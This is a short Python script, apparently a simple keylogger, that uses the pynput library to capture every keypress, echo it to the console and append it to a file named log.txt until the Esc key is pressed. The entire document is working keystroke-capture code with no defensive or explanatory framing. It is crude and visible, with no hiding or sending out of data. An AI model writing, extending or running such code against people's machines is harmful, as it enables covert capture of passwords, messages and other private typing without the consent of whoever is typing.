from pynput import keyboard

def on_press(key):
    key = str(key)
    key = key.replace("'", "")
    print(key)

    if key == "Key.enter": 
        key = '\n'
    
    if key == "Key.tab": 
        key = " tab "

    if key == "Key.space": 
        key = " "

    with open("log.txt", "a") as file:
         file.write(key)
         file.write(" ")


def on_release(key):
    if key == keyboard.Key.esc:
# stop listening!
        return False

with keyboard.Listener(on_press = on_press, on_release = on_release) as Listener:
    Listener.join()